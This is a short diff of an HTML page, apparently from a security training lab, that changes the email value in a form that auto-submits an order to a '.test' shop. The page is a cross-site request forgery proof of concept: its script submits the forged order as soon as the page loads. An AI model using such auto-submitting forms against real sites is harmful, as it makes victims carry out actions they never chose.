@@ -10,7 +10,7 @@
 <body>
 <form action="https://pits-super-secure-software-shop.test/order" id="order" method="get">
     <input type="number" name="amount" value="42" title="amount">
-    <input type="email" name="email" value="awesome@attacker.ru" title="email">
+    <input type="email" name="email" value="awesome.attacker@domain.tld" title="email">
 </form>
 <script>
   document.getElementById('order').submit()
